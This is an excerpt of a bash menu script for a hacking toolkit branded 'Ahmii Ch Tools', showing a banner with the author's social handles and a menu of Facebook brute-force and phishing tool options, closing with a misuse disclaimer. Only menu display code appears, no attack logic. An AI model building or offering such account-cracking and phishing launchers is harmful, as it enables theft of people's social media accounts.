...
echo $i" |"$cy"     Welcome to Ahmii Ch Tools"$i"                       |"
echo $i" |"$me"─────────────────────────────────────────────"$i"|"
echo $i" |"$pu" AUTHOR          :"$ku" Ahmii Ch "$i"                    |"
echo $i" |"$pu" YouTube Channel :"$ku" Ahmad Tricker"$i"                |"
echo $i" |"$pu" Facebook        :"$ku" Ahmii Ch"$i"                     |"
echo $i" |"$pu" Github.com      :"$ku" Ahmii Ch"$i"                     |"
echo $i" |"$pu" Group           :"$ku" Baba-Gangster"$i"                |"
echo $i"["$bi"•"$i"]"$me"───────────────────────────────────────────"$i"["$bi"•"$i"]"
echo
echo $i"────────────────────────────────    ─────"
echo $i"|"$me" 1"$i" |"$cy" BRUTEFORCE FB PHP        "$i"|"$i"    |"$cy" A"$i" |"
echo $i"|"$me" 2"$i" |"$cy" BRUTEFORCE FB BR1G4D3    "$i"|"$i"    |"$cy" H"$i" |"
echo $i"|"$me" 3"$i" |"$cy" BRUTEFORCE FB Ahmii      "$i"|"$i"    |"$cy" M"$i" |"
echo $i"|"$me" 4"$i" |"$cy" BRUTEFORCE FB MBF        "$i"|"$i"    |"$cy" I"$i" |"
echo $i"|"$me" 5"$i" |"$cy" FACEBRUTE N1ght420       "$i"|"$i"    |"$cy" I"$i" |"
...
echo $i"|"$me"16"$i" |"$cy" PHISING FACEBOOK 3       "$i"|"$i"    |"$cy" A"$i" |"
...
then
clear
figlet -f slant "Baba-Gangster"|lolcat
sleep 1
...
sleep 2
echo $cy"Youtube  :"$cy" Ahmad Tricker"
echo $cy"Facebook :"$cy" Ahmii Ch"
sleep 2
echo $cy">> I'm not responsible for any miss use<<"
exit
fi
